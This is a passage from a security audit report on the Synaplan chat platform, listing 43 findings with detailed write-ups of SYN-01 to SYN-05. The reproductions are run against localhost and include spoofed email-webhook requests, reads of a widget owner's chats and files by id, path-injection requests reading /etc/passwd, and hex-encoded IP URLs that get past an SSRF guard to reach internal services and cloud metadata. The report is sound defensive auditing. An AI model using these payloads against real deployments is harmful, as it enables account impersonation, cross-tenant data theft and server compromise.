# Synaplan security audit report

- Commit audited: `a2e57b08dc79e146927471224c6b6426619bddc4` (`main`).
- Target: this repository and the local Docker Compose stack (App `http://localhost:5173`, API `http://localhost:8000`). No traffic left localhost, with one possible exception listed in Appendix A.
- Local conditions that shaped testing: AI provider `test` (canned answers, constant embedding vector), `APP_ENV=dev`, `EGRESS.MODE=off` (seeded default), WhatsApp / Telegram / Federation / Stripe / M365 / Dropbox / Apple sign-in not configured, Apple IAP in `Xcode` environment, `LOOP.ENABLED` on.
- No code was changed, nothing was committed. Fixes are diffs or designs in this file.
- Paths are relative to the repository root. "Live" means reproduced on the running stack with accounts created for the audit (`audit-*@example.com|.test`) or the seeded demo account. Secrets, tokens and passwords are not reproduced anywhere in this file.
- Detailed per-area notes with every request and response are in `_devextras/security-audit/reviewer-notes/`.

## 1. Executive summary

**Posture.** The ordinary authenticated surface is in good shape: 130 admin route/method combinations reject a normal user, 39 cross-tenant attempts on agents, prompts, memories, widgets and MCP servers were refused, chat/file/share ownership checks held under a two-tenant matrix, JWT handling is strict, dependencies have no known advisories, CI workflows are pinned, production compose defaults are sound, and the code sandbox held against every escape attempt. Earlier advisories (upload path traversal, uploaded-HTML XSS, `analyze_image` SSRF) are fixed correctly.

The serious problems share three root causes:

1. **Anonymous channels are turned into a real user and then authorised as that user.** The email webhook trusts the JSON `from`; a widget visitor *is* the widget owner for every ownership check; all guests share one processing user. This yields unauthenticated, cross-tenant read and write (SYN-01, SYN-02, SYN-08, SYN-13).
2. **Outbound requests are guarded per call site, and the shared guard fails open.** Hosts the guard cannot parse are allowed, redirects are not re-checked, some callers have no guard at all, and the egress layer is off by default (SYN-05, SYN-06, SYN-07, SYN-20, SYN-24).
3. **State-changing GET routes plus a renderer that loads same-origin and external images.** Visitor-written text can make an operator's browser run chat turns or write settings, and model output can leak data to a third-party host (SYN-09, SYN-15, SYN-16).

**Top 5 risks**

| # | Risk | Findings |
|---|---|---|
| 1 | Anyone on the network can act as any registered user by email address and read their memories, chat digests and knowledge passages | SYN-01 |
| 2 | Anyone can read and write any chat and download any file of every account that has published a widget | SYN-02 |
| 3 | Any signed-in user can read internal services (unauthenticated Qdrant with all tenants' vectors, Tika, cloud metadata) through URL features | SYN-05, SYN-06, SYN-07 |
| 4 | A user with the Synaform plugin can read and delete any file in the backend container as root, including the environment file | SYN-03 |
| 5 | Identity is taken from unsigned input on optional channels: Apple sign-in email, WhatsApp sender | SYN-04, SYN-08 |

**Counts**

| Severity | Total | Confirmed | Suspected |
|---|---|---|---|
| Critical | 4 | 3 | 1 |
| High | 6 | 6 | 0 |
| Medium | 21 | 19 | 2 |
| Low | 12 | 10 | 2 |
| **All** | **43** | **38** | **5** |

"Confirmed" follows the brief: reproduced live, or a complete reachable path with no effective guard. The findings table says which of the two applies. Seventeen items were re-checked in source or live by the lead after the area review (marked ✔ in the table); the rest rest on the area reviewer's evidence in the notes.

## 2. Attack-surface map and threat model

**Entry points**

| Surface | Detail |
|---|---|
| Firewalls | `openai_compat` (`^/v1`), `mcp`, `wopi` (security off, token in query), `api` (Cookie, OAuth bearer, OIDC bearer, query token, API key), `main` (no catch-all) |
| Anonymous | 78 `PUBLIC_ACCESS` rules in `backend/config/packages/security.yaml` (full rule-to-route table in `reviewer-notes/findings-public-webhooks.md` §1.1). No rule matches an unintended route today; 40+ are prefix-only regexes |
| Channels | Widget (`/api/v1/widget/{id}/*`, `/api/v1/messages/stream` with widget headers), guest chat, inbound email webhook, WhatsApp, Telegram, saved-task webhooks |
| Machine-to-machine | Stripe, Apple/Google IAP notifications, voice sidecar HMAC, WOPI, OAuth server (`/oauth/*`), connector OAuth callbacks |
| Authenticated | 771 routes; admin (118), plugins (`/api/v1/user/{userId}/plugins/*`, 82), `/v1` gateway, `/mcp` |
| Outbound | ~20 call sites fetching user/model-supplied URLs; IMAP; MCP; custom HTTP tools; webhooks |
| Execution | `synaplan-compute` sidecar (root + Docker socket), ImageMagick, ffmpeg, Tika |
| Client | Vue app markdown renderer, embeddable widget, shared-chat page, legacy `/api.php` |

**Trust boundaries and assets**

- Tenant boundary = `userId` on every row. There is no tenant object above the user; groups and shares are additive.
- Highest-value assets: chat history, files, memories and RAG vectors (Qdrant, unauthenticated inside the compose network), provider keys (encrypted in DB, plain in the environment file), `APP_SECRET` (signs sessions), connected-account tokens (M365, Dropbox, MCP).
- Actors considered: anonymous internet client; widget visitor; guest; registered user of the lowest level; user with a plugin enabled; paid user with an API key; admin; a web page or document that reaches the model (prompt injection); a network neighbour of a dev install.

**Main threats found reachable**

| Threat | Path |
|---|---|
| Spoofed channel identity | email `from`, WhatsApp `from`, Apple `user.email` → real `User` |
| Confused deputy | widget visitor / guest runs with owner / shared user identity; ownership checks compare against that identity |
| SSRF to data services | URL watch, widget API test, OpenAPI import, web fetch, plugins → Qdrant, Tika, compute, metadata |
| Request forgery from content | markdown image → `GET /api/v1/messages/stream`, `/api.php` |
| Local file access | client-controlled stored path in a plugin; ImageMagick coders |
| Session persistence | access token re-mints itself |

## 3. Findings table

Status: C-live = Confirmed, reproduced; C-trace = Confirmed by complete code path, not reproduced; S = Suspected. ✔ = independently re-checked by the lead.

| ID | Title | Severity | Status | Component | CWE |
|---|---|---|---|---|---|
| SYN-01 | Unauthenticated inbound-email webhook runs turns as any registered user and returns their private context | Critical | C-live ✔ | `WebhookController::email` | 306, 290 |
| SYN-02 | Widget visitor acts as the widget owner: any owner chat and file by id | Critical | C-live ✔ | Widget turn, `/messages/stream` | 639, 863 |
| SYN-03 | Synaform: client-controlled stored path gives arbitrary file read and delete as root | Critical | C-live (read) ✔ | `plugins/synaform` | 22, 73 |
| SYN-04 | Apple sign-in links to an existing account by unsigned client email | Critical (if Apple enabled) | S ✔ | `AppleAuthController` | 290, 345 |
| SYN-05 | `SsrfGuard` fails open for hosts it cannot parse (hex, Unicode digits) | High | C-live ✔ | `SsrfGuard`, ~15 callers | 918, 436 |
| SYN-06 | Redirects followed without per-hop check in `UrlContentService` | High | C-live ✔ | `UrlContentService` | 918 |
| SYN-07 | Synaform URL sources: full-read SSRF with no guard | High | C-live ✔ | `plugins/synaform` | 918 |
| SYN-08 | WhatsApp webhook accepts unsigned payloads; sender forgery and phone-verification hijack | High | C-trace ✔ | `WebhookController::whatsapp` | 345, 306 |
| SYN-09 | On-site request forgery: same-origin markdown image triggers GET routes that change state | High | C-live ✔ | `useMarkdown`, `StreamController`, `/api.php` | 352, 650 |
| SYN-10 | `GET /api/v1/messages/{id}/status` returns any user's reply text | High | C-live ✔ | `MessageEnqueueService` | 639 |
| SYN-11 | Access token renews itself; logout, revoke-all and password reset do not end a session | Medium | C-live ✔ | `AuthController::getToken` | 613, 598 |
| SYN-12 | SVG uploaded as `.heic` reaches ImageMagick's SVG/MVG/MSL coders | Medium | C-live | `HeicConverter` | 434, 20 |
| SYN-13 | Guests can attach and download other guests' files | Medium | C-live | `/messages/stream` guest path | 639 |
| SYN-14 | Widget visitor uploads are indexed into a RAG group shared by all visitors | Medium | C-live | `WidgetPublicController::upload` | 668 |
| SYN-15 | Legacy `promptUpdate` rewrites the global system prompt's metadata | Medium | C-live ✔ | `LegacyApiController` | 639, 862 |
| SYN-16 | Markdown sanitiser passes raw HTML with external `img` and `style` URLs; no CSP | Medium | C-live (renderer) | `useMarkdown` | 79, 200 |
| SYN-17 | No throttling on login, forgot-password, reset-password, verify-email | Medium | C-live | `AuthController` | 307, 799 |
| SYN-18 | Pre-registration hijack: unverified password signup survives a later social login | Medium | C-trace | Social controllers | 287 |
| SYN-19 | Connector and MCP OAuth callbacks are not bound to the browser that started the flow | Medium | C-trace | `OAuthConsentService` | 352, 384 |
| SYN-20 | Inbound-email "test connection" opens TCP to arbitrary internal hosts and ports | Medium | C-live ✔ | `InboundEmailHandlerService` | 918 |
| SYN-21 | Widget live-API data trusts a visitor-supplied `externalUserId` | Medium | C-trace ✔ | `WidgetApiContext` | 639 |
| SYN-22 | MCP write tools run without approval when driven by injected content | Medium | C-trace | Tool approval policy | 862, 1427 |
| SYN-23 | Apple IAP: refunded receipt re-redeemable; redeem race; no bundle-id binding; `Xcode` mode unguarded | Medium | C-live (local) | `Service/Iap` | 294, 362, 347 |
| SYN-24 | castingdata `api_url` SSRF filter bypass | Medium | C-live | `plugins/castingdata` | 918 |
| SYN-25 | Admin model-import SQL validator can be bypassed | Medium (admin) | C-live (no-op) | `ModelSqlValidator` | 89, 184 |
| SYN-26 | Compute sidecar creates files outside the sandbox through a symlink in `/out` | Medium | C-live (sidecar) ✔ | `synaplan-compute` | 59 |
| SYN-27 | `install.sh` try mode publishes the dev stack on all interfaces | Medium | C-live | `install.sh`, `docker-compose.yml` | 1188, 306 |
| SYN-28 | Credentials in public git history | Medium | C (presence) | git history | 540, 798 |
| SYN-29 | API keys, refresh, reset and verification tokens stored in plaintext | Medium | C-trace | `ApiKeyRepository`, `TokenRepository` | 256, 522 |
| SYN-30 | AI `[IMAGE:…]` marker sets `Message.filePath` without validation | Medium | S | `MessageController`, `AgainHandler` | 639, 22 |
| SYN-31 | Generated media served anonymously under guessable file names | Medium | S | `StaticUploadController` | 330, 639 |
| SYN-32 | Login CSRF: OAuth state not bound to the browser; login accepts any content type | Low | C-trace | `OAuthStateService` | 352 |
| SYN-33 | Group directory visible to all users; shares can target a foreign group | Low | C-live / C-trace | `ShareService` | 200, 285 |
| SYN-34 | RAG `similar/{chunkId}` uses a foreign chunk as query vector | Low | C-trace | `VectorSearchService` | 639 |
| SYN-35 | Public share page leaks an edited-away first question | Low | C-live | `SharedChatPageController` | 200 |
| SYN-36 | Widget domain allow-list bypass (`x-widget-host`, suffix match) | Low | C-live ✔ | `WidgetDomainGuard` | 346, 185 |
| SYN-37 | Internal `tools:` prompts readable by any signed-in user | Low | C-live ✔ | `PromptController::get` | 200 |
| SYN-38 | `/api/test/*` public in every environment; `/api/test/embed` calls the real provider | Low | C-live | `TestController` | 489 |
| SYN-39 | Compute sidecar: root + Docker socket behind a fixed default token on the shared network | Low | C (config) | compose | 1188, 250 |
| SYN-40 | `APP_SECRET` signs three token families; `EncryptionService` is CBC without a MAC | Low | C-trace | crypto | 323, 353 |
| SYN-41 | First-run setup needs no operator proof | Low | S | `SetupController` | 306 |
| SYN-42 | CSV/XLSX formula injection through the widget session id | Low | C-trace | `WidgetExportService` | 1236 |
| SYN-43 | Three renderer/parser weaknesses not shown exploitable | Low | S | `MessageText.vue`, `chatArtifacts.ts`, ffmpeg | 79, 693, 73 |

## 4. Findings

### SYN-01 Unauthenticated inbound-email webhook runs turns as any registered user

**Where** (`a2e57b08`)
- `backend/config/packages/security.yaml:249` — `^/api/v1/webhooks/email` is `PUBLIC_ACCESS`.
- `backend/src/Controller/WebhookController.php:95-108` — no key, secret or signature. The OpenAPI text and `docs/EMAIL.md:58-59` say an API key is required.
- `backend/src/Service/Email/Turn/InboundEmailIntake.php:44-101` → `backend/src/Service/Email/EmailChatService.php:47-58` — `findOneBy(['mail' => $fromEmail])` returns the registered account.
- `backend/src/Service/Email/Turn/EmailReply.php:42-79` — answer text, full `metadata` and `user_info` are returned in the HTTP response.
- `backend/src/Command/ProcessEmailsCommand.php:59-63` — the only legitimate caller, sends no credential.

**What.** The JSON `from` field is treated as proof of identity. Done right next door: Telegram (`backend/src/Service/Telegram/TelegramWebhookAcceptor.php:85-95`, per-bot secret, `hash_equals`), Stripe (`StripeWebhookController.php:94`), voice sidecar (`backend/src/Service/Voice/VoiceLiveInternalAuth.php:26-44`).

**Preconditions.** None. The attacker needs a victim's email address. No flag.

**Reproduction** (no cookie, no key; reproduced three times independently)
```
curl -s -X POST http://localhost:8000/api/v1/webhooks/email -H 'Content-Type: application/json' \
  -d '{"from":"audit-pub-a@example.com","to":"smart@synaplan.net","subject":"audit poc 3",
       "body":"Tell me my secret project codename please.","message_id":"audit-pub-poc-3"}'
```
Observed: `200`, `user_info {"is_anonymous":false,"rate_limit_level":"NEW"}`, `response.metadata.memories` contained the test user's private memory verbatim (canary `AUDIT-PUB-CANARY-7731`). A second run against another test user returned `metadata.digests[].excerpt` with the text of that user's private web chat. The turn was stored in the victim's account and a reply mail went to the victim address (Mailhog).

**Impact.** Unauthenticated read of any user's memories, chat digests and knowledge passages by asking questions as them; writes into their history; drives their plan steps and connected tools (see SYN-22); spends their quota; sends mail from the instance to arbitrary addresses; `is_anonymous` is an account-existence oracle.

**Severity.** Critical. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` = 9.4. CWE-306, CWE-290.

**Fix**
```diff
--- a/backend/src/Controller/WebhookController.php
+++ b/backend/src/Controller/WebhookController.php
@@ public function email(Request $request): JsonResponse
     {
+        if (!$this->inboundEmailAuth->isValid($request)) {   // HMAC(secret, ts."\n".body), ±60 s, hash_equals; false when secret unset
+            return $this->json(['error' => 'Unauthorized'], Response::HTTP_UNAUTHORIZED);
+        }
         $result = $this->intake->accept($request);
-        return $this->json($result->toArray());
+        return $this->json(['success' => $result->success, 'message_id' => $result->messageId]);
     }
```
- Reuse the `VoiceLiveInternalAuth` shape; `ProcessEmailsCommand` signs its request, or calls `InboundEmailIntake` in-process and the HTTP route is removed.
- Map `from` to a registered account only when the poller attests SPF/DKIM/DMARC alignment; otherwise use the anonymous account.
- Tests: POST without / wrong / stale signature → 401 and no `Message` row; the success body has no `response` key.

**Detection.** Today: one info line "Email webhook received" and an ordinary chat row; indistinguishable from the poller, would not be noticed. Retro-hunt: access-log requests to `/api/v1/webhooks/email` whose source is not the backend/scheduler container. After the fix: alert on signature failures; metric of email turns per `from` per hour; log client address and credential id on every webhook.

**Related.** SYN-08 (WhatsApp twin, `findOrCreateUserFromPhone`). Email attachment URL fetch on this route inherits SYN-05.

---

### SYN-02 Widget visitor acts as the widget owner: any owner chat and file by id

**Where**
- `backend/src/Service/Chat/Stream/StreamCallerResolver.php:61-65,85-124` — `X-Widget-Id` + `X-Widget-Session` on the public stream route make the caller the owner `User`; session created on demand; `WidgetDomainGuard` not called.
- `backend/src/Service/Widget/Turn/WidgetTurnGate.php:77-78` — `chatId` from the anonymous body.
- `backend/src/Service/Widget/Turn/WidgetConversation.php:113` — `ownedChat($turn, $turn->session->getChatId()) ?? ownedChat($turn, $turn->chatId)`; `:142-146` checks only `chat.userId === owner.id`; `:70` binds the session to that chat.
- `backend/src/Controller/WidgetPublicController.php:773-930` — `history()` returns up to 50 messages of the session chat; `:981-1002` — download allows any owner file attached in that chat.
- `backend/src/Service/Chat/Stream/StreamTurnPreparer.php:130-153` — `loadChat`: session binding is guest-only; `:254-272` — `attachFiles` compares the file owner to `caller->user` (the owner).
- `backend/src/Service/Chat/Stream/StreamRequestResolver.php:74-141`, `StreamAgentPinResolver.php`, `backend/src/Service/Agent/AgentRuntimeResolver.php:52-97` — `agentId`, `draft`, `modelId`, `webSearch` honoured for widget callers (traced, not exercised).

**What.** Every "belongs to the caller" check is true for the owner's private data because the visitor is represented as the owner. Done right in the same files: visitor uploads are bound to the session (`WidgetConversation.php:207-228`), a guest may only use its session's chat (`StreamTurnPreparer.php:142-151`), a widget never honours a caller `ragGroupKey`.

**Preconditions.** An active widget of the victim (the id is public in the embed code). Chat and file ids are sequential integers. `allowedDomains` does not help (SYN-36, and the stream path never checks it).

**Reproduction** (anonymous; reproduced by three reviewers on three widgets)

Chat read:
```
POST /api/v1/widget/wdg_baa5…/message   {"sessionId":"<new>","text":"hi","chatId":4700}        -> 200 SSE
GET  /api/v1/widget/wdg_baa5…/history?sessionId=<same>
 -> 200 {"success":true,"chatId":4700,"messages":[{"id":4049,"direction":"IN",
        "text":"PRIVATE-NOTE audit-authzA: my vault code is ZEBRA-4471","messageType":"WEB",…},…]}
```
File read (358 = owner's private upload, 4700 = owner's private chat):
```
GET  /api/v1/widget/<wdg>/files/358/download?sessionId=<sid>     -> 403 "File not associated with this chat"
POST /api/v1/messages/stream   X-Widget-Id: <wdg>   X-Widget-Session: <sid>
     {"chatId":4700,"message":"x","fileIds":"358","trackId":<ts>}   -> 200 SSE "Processing 1 file(s)..."
GET  /api/v1/widget/<wdg>/files/358/download?sessionId=<sid>     -> 200 "CONFIDENTIAL audit-authzA payroll: alice 100000"
```

**Impact.** For every account with a published widget (typically a business or admin account): anonymous read of any chat, download of any file, message injection into private chats, other visitors' widget conversations, the owner's assistants and drafts, the owner's model budget. Cited RAG passages of the bound chat become readable through `ragChunk` (`WidgetPublicController.php:375`). Per-session limits are bypassed with new session ids.

**Severity.** Critical. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` = 8.2 (9.3 with `S:C`); Critical per the guide (unauthenticated cross-tenant read at scale). CWE-639, CWE-863, CWE-441.

**Fix**
```diff
--- a/backend/src/Service/Widget/Turn/WidgetConversation.php
+++ b/backend/src/Service/Widget/Turn/WidgetConversation.php
@@ -113 +113 @@
-        $chat = $this->ownedChat($turn, $turn->session->getChatId()) ?? $this->ownedChat($turn, $turn->chatId);
+        $chat = $this->ownedChat($turn, $turn->session->getChatId());
--- a/backend/src/Service/Chat/Stream/StreamTurnPreparer.php
+++ b/backend/src/Service/Chat/Stream/StreamTurnPreparer.php
@@ loadChat()
+        if (null !== $turn->caller->widgetSession
+            && $turn->caller->widgetSession->getChatId() !== $chat->getId()) {
+            return $this->refuse('chat_not_in_session');
+        }
@@ attachFiles()
-            if ($file->getUserId() === $turn->caller->user->getId()) {
+            if ($this->callerMayAttach($turn->caller, $file, $chat)) {   // user: owner match; widget: file.userSessionId === session.id; guest: file already in session chat
```
- Drop `chatId` from `WidgetTurn` / `WidgetTurnGate`. For widget and guest callers ignore `agentId`, `draft`, `modelId`, `webSearch`. Run the widget's own gates on the stream path, or stop resolving widget callers there if the widget UI only uses `/widget/{id}/message`.
- `history` and `downloadWidgetFile` require a widget-sourced chat; drop the owner-file branch in download.
- Design: an explicit principal (`user | widgetSession | guestSession`) so an owner check can never pass for a visitor.
- Tests: fresh session + body `chatId` of an owner web chat creates a new chat; `/history` never returns `messageType` `WEB`; stream with widget headers and an owner `fileIds` attaches nothing and download stays 403; legitimate session chat still works.

**Detection.** Today: ordinary widget traffic. Retro-hunt: widget sessions whose bound chat has a non-widget source; file-link rows where the file has no `userSessionId` but the message came from a widget session. After the fix: warn when a widget request names a `chatId` other than the session's or any `fileIds` not bound to the session; alert on a 403 → 200 transition per session on the widget download route.

**Related.** SYN-13 (guest twin), SYN-14, SYN-21; `StreamTurnPreparer::loadContinued`, `provenQuoteSource`. Suspected, untested: on the stream path no `WIDGET:<id>` RAG group is forced for widget callers, so retrieval may run over the owner's whole knowledge base.

---

### SYN-03 Synaform: client-controlled stored path gives arbitrary file read and delete as root

**Where** — `plugins/synaform/backend/Controller/SynaformController.php`
- Writers: `candidatesCreate` `:1830-1832` (`'field_values' => $data['field_values'] ?? []`, verbatim), `candidatesUpdate` `:1903-1938`, `candidates_variables_update` `:4387`.
- Sinks: `candidatesImageGet` `:5042-5050` (`new BinaryFileResponse($meta['path'], 200, ['Content-Type' => $meta['mime'] …])`), `candidatesImageDelete` `:5073-5075` (`@unlink`), `processImages` `:9208-9228`, `:9286` (`$zip->addFile`), `autoExtractProfileImages` `:5129`.
- Gate: `canAccessPlugin` `:5432-5443` (own user id and `P_synaform.enabled=1`).

**What.** The upload handler stores an absolute path in `field_values` (`:4999-5010`); create/update accept the same structure from the client, and the image endpoint serves whatever path is stored. PHP runs as root in the backend container. Done right: `candidatesFileDownload` `:2216` uses `basename()`.

**Preconditions.** A signed-in user with the Synaform plugin enabled. Repository default for `DEFAULT_USER_PLUGINS` is `[]` (`backend/config/services.yaml:272`); the local stack enables it for every new user (`ProvisionDefaultUserPluginsMessageHandler.php:27-50`). Not examined: whether a user can enable the plugin for themselves.

**Reproduction** (user 4928)
```
POST /api/v1/user/4928/plugins/synaform/candidates
     {"name":"audit-inj","field_values":{"pic":{"path":"/etc/hostname","mime":"text/plain"},
                                         "h":{"path":"/etc/hostname","mime":"text/html"}}}   -> 201 entry_a149573a5d3f
GET  …/candidates/entry_a149573a5d3f/image/pic  -> 200 text/plain, Cache-Control: max-age=60, public, body = container hostname
GET  …/image/h                                   -> 200 text/html, no CSP
```
`/etc/passwd` returned 888 bytes. The backend environment file (mode 0600 root) returned 200 with a body length equal to the file size; the body was discarded unread. Delete was traced, not executed.

**Impact.** Read of the environment file (all provider keys, `APP_SECRET` → forge any session, DB credentials), any tenant's uploads, source; deletion of arbitrary files; attacker-chosen `Content-Type` gives same-origin HTML served with a public cache header. With `APP_SECRET` this is full instance takeover.

**Severity.** Critical where the plugin is enabled. CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 9.9. CWE-22, CWE-73.

**Fix.** Store the file name only and rebuild the path server-side:
```diff
@@ candidatesImageGet()
-        return new BinaryFileResponse($meta['path'], 200, ['Content-Type' => $meta['mime'] ?? 'image/jpeg']);
+        $dir  = $this->candidateImageDir($userId, $candidateId);
+        $path = realpath($dir.'/'.basename((string) ($meta['file'] ?? '')));
+        if (false === $path || !str_starts_with($path, $dir.'/')) {
+            throw $this->createNotFoundException();
+        }
+        return new BinaryFileResponse($path, 200, ['Content-Type' => self::IMAGE_MIME[pathinfo($path, PATHINFO_EXTENSION)] ?? 'application/octet-stream',
+                                                    'Cache-Control' => 'private, max-age=60']);
```
- Strip client-supplied `path` / `mime` in create, update and variables update; same containment in delete, `processImages`, `autoExtractProfileImages`.
- Run PHP workers as a non-root user.
- Test: `PUT field_values.x.path=/etc/passwd` then `GET image/x` → 404; delete does not unlink.

**Detection.** Nothing is logged today. Retro-hunt: `plugin_data` rows for synaform whose `field_values.*.path` is outside the user's upload directory. After the fix: log and alert when a resolved image path fails containment.

**Related.** `candidatesFileDelete` `:2152-2164` uses `stored_as` without `basename` (not client-writable today). SYN-07 (same controller).

---

### SYN-04 Apple sign-in links to an existing account by unsigned client email

**Where**
- `backend/src/Controller/AppleAuthController.php:111,146,271-293` — `email` copied from the form field `user` (web) with no check; `:190-218` — from the JSON body (native).
- `:323` `$email = $claims['email'] ?? $profile['email'];` `:327-330` `findByAppleSub` else `findOneBy(['mail' => $email])`; `:333-336` only refusal is `isManagedExternally()`; `~:350` writes the caller's `apple_sub` to the matched account; `:372` `setEmailVerified(true)`.
- `backend/src/Service/Auth/AppleIdentityTokenVerifier.php:78-86` — returns `email: null` when the claim is absent; `emailVerified` never consulted; no `nonce`.

**What.** When the verified id token has no `email` claim, lookup falls back to plain client input, signs the caller in as the matched account and binds the caller's Apple `sub` to it permanently. Done right: `backend/src/Service/OidcUserService.php:73-125` matches on validated claims only and refuses cross-provider merges.

**Preconditions.** Apple sign-in configured; attacker has any Apple ID; victim email known; victim not organisation-managed.

**Status: Suspected.** The Synaplan path is complete. One hop is Apple's behaviour and could not be observed (third-party traffic is out of scope, Apple is not configured locally): Apple must issue an id token without `email`, which is expected when the authorize request omits the `email` scope — a parameter the attacker controls in their own browser. Missing to confirm: a test install with Apple configured, or a controller test with a stub verifier.

**Reproduction** (not executed)
1. `GET /api/v1/auth/apple/login`; keep the signed `state`.
2. Open Apple's authorize URL with the same `client_id`, `redirect_uri`, `state`, without `scope`; sign in with the attacker's Apple ID.
3. `POST /api/v1/auth/apple/callback` with `code=<code>&state=<state>&user={"email":"<victim>"}`.
4. Expected: redirect with auth cookies for the victim account.

**Impact.** Takeover of any account by email, including admin, with a persistent backdoor; the victim's password keeps working.

**Severity.** Critical where enabled. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = 9.1 (7.4 with `AC:H`). CWE-290, CWE-345.

**Fix**
```diff
--- a/backend/src/Controller/AppleAuthController.php
+++ b/backend/src/Controller/AppleAuthController.php
@@ findOrCreateUser()
-        $email = $claims['email'] ?? $profile['email'];
-        $user = $this->userRepository->findByAppleSub($appleSub)
-            ?? $this->userRepository->findOneBy(['mail' => $email]);
+        $verifiedEmail = ($claims['emailVerified'] && null !== $claims['email']) ? $claims['email'] : null;
+        $user = $this->userRepository->findByAppleSub($appleSub);
+        if (null === $user && null !== $verifiedEmail) {
+            $user = $this->userRepository->findOneBy(['mail' => $verifiedEmail]);
+        }
```
Use `$profile['email']` at most as a display value on a new account. Send and verify a `nonce` bound to the state. Tests: stub verifier returning `email: null` plus a `user` field naming an existing account → no session for it, `apple_sub` unchanged; same for native and for `emailVerified: false`.

**Detection.** Today: a normal "Apple login" info line; no record that an identity was newly linked. Retro-hunt: accounts with an `apple_sub` and a password or another provider. Proposed: audit event "external identity linked to existing account" with the source of the email; alert when it is not a verified claim; mail the owner on every new link.

**Related.** `GoogleAuthController.php:187` links by email without checking `verified_email`; `GitHubAuthController.php:150-169` falls back to `$emails[0]` and links at `:210` (both Suspected, Low/Medium). SYN-18.

---

### SYN-05 `SsrfGuard` fails open for hosts it cannot parse

**Where**
- `backend/src/Service/Security/SsrfGuard.php:74-100` (`isBlockedHost`), `:250-268` (`resolveIps`: empty answer → not blocked), `:154-163` (`pinnedResolveOption` returns `[]`).
- `backend/src/Service/Egress/EgressHttpClient.php:50-52` — pass-through while `EGRESS.MODE=off` (seeded default).
- Reached through `UrlWatchService.php:53,116`; `UrlContentService.php:227,349,475,686,847`; `WidgetController.php:1313`; `Tool/Custom/OpenApiImporter.php:29-37`.

**What.** A host is treated as an IP only if `FILTER_VALIDATE_IP` accepts it; otherwise it is resolved with `gethostbynamel()` and "no answer" passes. `0xac.0x12.0x0.0xb` is neither, but curl normalises it to a dotted quad; Symfony's IDN step turns `①⑦②.18.0.11` and `127。0。0。1` into IPs after the guard has passed them. Lead's check inside the backend container: `gethostbynamel('0x7f.0x0.0x0.0x1')` and the full-width forms return `false`; decimal (`2130706433`) and short (`127.1`) forms resolve and are blocked. Done right: `AnalyzeImageTool.php:232-238`, `HttpToolExecutor.php:186-199`, `FederationUrlGuard.php:51`, `OpenAiCompatibleEndpointRegistry.php:427-432` refuse when nothing public was resolved; `NoPrivateNetworkHttpClient` (`backend/config/services.yaml:913-915`) checks the dialled address.

**Preconditions.** Any signed-in user. Default configuration.

**Reproduction** (demo account; Qdrant is 172.18.0.11 here)
```
POST /api/v1/url-watches {"url":"http://qdrant:6333/"}                              -> {"error":"blocked_url"}
POST /api/v1/url-watches {"url":"http://0xac.0x12.0x0.0xb:6333/collections"}        -> created, id N
POST /api/v1/url-watches/N/refresh
 -> {"result":{"collections":[{"name":"user_documents"},{"name":"user_memories"},{"name":"user_message_digests"}]},"status":"ok"}
POST /api/v1/widgets/{own}/test-api {"apiUrl":"http://0xac.0x12.0x0.0xb:6333/collections","apiToken":"x"}
 -> {"reachable":true,"responsePreview":"{\"result\":{\"collections\":[…"}
POST /api/v1/tools/custom/import-openapi/preview {"url":"http://0xac.0x12.0x0.0x5:6379/"}
 -> "Empty reply from server for \"http://172.18.0.5:6379/\""
http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/ -> "Failed to connect to 169.254.169.254 port 80" (request was made)
```

**Impact.** Full-response GET (and GET with an attacker-chosen bearer via `fetchApi`) to anything the backend can reach: unauthenticated Qdrant with every tenant's document, memory and digest vectors, Tika, Redis error oracle, cloud metadata on a cloud host, the compute sidecar where its token is the dev default (SYN-39). Also reachable by a model through `web_fetch` / link reading (traced only).

**Severity.** High. CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` = 8.5. CWE-918, CWE-436.

**Fix**
```diff
--- a/backend/src/Service/Security/SsrfGuard.php
+++ b/backend/src/Service/Security/SsrfGuard.php
@@ isBlockedHost()
+        $host = rtrim((string) idn_to_ascii($host, IDNA_DEFAULT, INTL_IDNA_VARIANT_UTS46), '.');
+        if ('' === $host || (preg_match('/^[0-9a-fx.]+$/i', $host) && false === filter_var($host, FILTER_VALIDATE_IP))) {
+            return true;                      // numeric-looking but not a canonical address
+        }
@@ resolveIps() caller
-        if ([] === $ips) { return false; }
+        if ([] === $ips) { return true; }     // fail closed
```
`pinnedResolveOption()` throws when nothing can be pinned. Better: wrap the client used for every typed URL in `NoPrivateNetworkHttpClient`, as MCP already does. Tests: `SsrfGuardTest` provider with `0x7f.1`, `0x7f.0.0.1`, `0177.0.0.1`, `2130706433`, `①②⑦.0.0.1`, `127。0。0。1`, `[::ffff:127.0.0.1]`, an unresolvable name; `UrlWatchService::register()` refuses them.

**Detection.** Today: `URL content fetched successfully` at info with the hex host; no warning (egress mode off). Retro-hunt: URL watches, widget API URLs and custom-tool specs whose host matches `^[0-9a-fx.]+$` but is not a dotted quad, or contains non-ASCII digits; Qdrant/Tika access logs for the `SynaplanBot` user agent. Proposed: count and alert on typed URLs with a non-canonical host and on any fetch whose dialled address is private.

**Related (same guard, same failure).** `GuardedDocumentDownload.php:50,87`; `InboundEmailAttachmentStore.php:272,290-294`; `OutboundWebhookRunner.php:60` (https, blind POST); `WebDavClient.php:263`; `WordPressIntegrationService.php:358,376`; `McpServerConfigController.php:347` (save-time only); `WidgetApiContext.php:121` (runs on visitor traffic). NAT64 `64:ff9b::/96` literals are not blocked.

---

### SYN-06 Redirects followed without per-hop check in `UrlContentService`

**Where.** `backend/src/Service/Research/UrlContentService.php:241` (`fetch`, 3 redirects), `:713` (`fetchForCrawling`, 5), `:861` (`fetchApi`, 3), `:1168` (robots.txt, 2). None pins DNS. Done right in the same class: `:495` `max_redirects: 0` with a per-hop loop (`fetchForReading`, `startReading`); also `GuardedDocumentDownload.php:44-70`.

**What.** Only the first URL is validated. A public page answering `302 Location: http://qdrant:6333/…` is followed and the body returned. The same four calls leave a DNS-rebinding window (Suspected; needs a rebinding resolver).

**Preconditions.** Any signed-in user and any public web server. Survives a fix of SYN-05.

